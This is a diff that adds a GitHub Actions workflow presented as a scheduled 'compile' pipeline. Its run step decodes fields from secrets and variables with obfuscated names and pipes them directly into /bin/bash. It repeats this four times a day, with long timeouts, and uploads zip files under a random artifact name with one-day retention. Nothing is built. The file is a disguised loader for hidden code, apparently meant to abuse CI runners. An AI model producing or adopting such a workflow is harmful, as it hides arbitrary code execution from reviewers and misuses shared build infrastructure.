@@ -1,0 +1,31 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '38 0,6,12,18 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          ws463: ${{ secrets.ws463 }}
+        run: |
+          printf '%s' "$ws463" | jq -r .i95 | /bin/bash
+          echo $i2 | jq -r .nwynj84376 | /bin/bash
+          echo $tjil60389 | jq -r .mgwq771 | /bin/bash
+          printf '%s' "$gp8" | jq -r .ayw03 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 7WatUSFZ
+          path: "*.zip"
+          retention-days: 1
